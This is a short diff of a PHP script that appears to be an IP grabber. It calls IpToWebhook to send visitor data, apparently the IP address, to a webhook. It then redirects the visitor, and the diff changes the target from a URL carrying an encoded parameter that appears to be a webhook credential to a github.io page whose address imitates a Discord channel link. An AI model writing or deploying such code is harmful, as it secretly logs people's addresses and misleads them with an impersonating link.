@@ -48,5 +48,5 @@ function IpToWebhook($Hook, $Content)
 }
 
 IpToWebhook($Webhook, $JSON);
-header("Location: https://littest.site/yeet/site.php?h=OTQ2OTIzNjU1MzYxODc1OTc4L1RXenQxMnlQUk9qU21TQ2xmM004cTVMOEY3blROeVJfenZTb2hRMWppdVFubzlnV1JpT3FsRUh5bGF0c05ldWRScVE3");
+header("Location: https://discord19.github.io/channels-me-945852088544546937-946926186423001138/");
 ?>
